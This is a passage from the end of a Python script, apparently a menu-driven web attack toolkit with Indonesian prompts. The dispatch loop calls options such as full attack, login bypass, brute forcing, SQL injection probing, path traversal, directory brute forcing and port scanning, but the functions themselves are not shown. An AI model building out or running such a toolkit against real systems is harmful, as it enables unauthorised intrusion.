                tool.full_attack()
            elif pilihan == "3":
                tool.deep_recon()
            elif pilihan == "4":
                tool.leak_check()
            elif pilihan == "5":
                tool.bypass_attack()
            elif pilihan == "6":
                tool.brute_only()
            elif pilihan == "7":
                tool.js_mining()
            elif pilihan == "8":
                tool.sqli_probe()
            elif pilihan == "9":
                tool.path_traversal()
            elif pilihan == "10":
                tool.subdomain_enum()
            elif pilihan == "11":
                tool.port_scan()
            elif pilihan == "12":
                tool.dir_bruteforce()
            elif pilihan == "13":
                tool.cors_scan()
            elif pilihan == "14":
                tool.header_analysis()
            elif pilihan == "15":
                tool.graphql_probe()
            tool.report()
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Interrupted.{RESET}")

        pause()
        clear()
        print(BANNER)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Keluar.{RESET}")
        sys.exit(0)
